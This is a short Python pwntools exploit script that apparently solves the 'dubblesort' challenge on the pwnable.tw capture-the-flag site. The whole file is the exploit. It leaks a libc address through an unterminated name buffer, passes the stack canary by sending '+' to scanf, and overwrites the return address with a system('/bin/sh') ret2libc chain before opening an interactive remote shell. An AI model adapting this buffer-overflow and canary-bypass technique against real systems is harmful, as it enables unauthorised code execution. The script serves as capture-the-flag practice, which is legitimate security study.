from pwn import *
#context.log_level = "debug"

#HOST = "192.168.0.23"
HOST = "chall.pwnable.tw"
#PORT = 4444
PORT = 10101

s = remote(HOST, PORT)

elf = ELF("./dubblesort")
libc = ELF("./libc_32.so.6")
pause()

system_off = libc.symbols["system"]
binsh_off = list(libc.search("/bin/sh"))[0]

s.sendafter("name :", "A"*25)
s.recvuntil("A"*25)
save = u32("\x00" + s.recv(3))

libc_base = save - 0x1b0000
system_addr = libc_base + system_off
binsh_addr = libc_base + binsh_off

print "[*] libc_base : " + hex(libc_base)
print "[*] system_addr : " + hex(system_addr)
print "[*] binsh_addr : " + hex(binsh_addr)

s.sendafter("sort :", "35\n")

for i in range(31):
  if(i < 23):
    s.recv()
    print str(i) + " is " + str(i)
    s.sendline(str(i))

  if(i == 23):
    s.recv()
    print str(i) + " is 0xaaaaaaaa"
    s.sendline("2863311530")

  if(i == 24):
    s.recv()
    print "canary"
    s.sendline("+")
  
  if(i > 24):
    s.recv()
    print str(i) + " is 0xaaaaaaaa"
    s.sendline("2863311530")

s.recv()
s.sendline("1") # ebp

s.recv()
s.sendline(str(system_addr)) # ret

s.recv()
s.sendline(str(system_addr)) # ret + 4

s.recv()
s.sendline(str(binsh_addr)) # ret + 8

sleep(2)
s.recv()

s.interactive()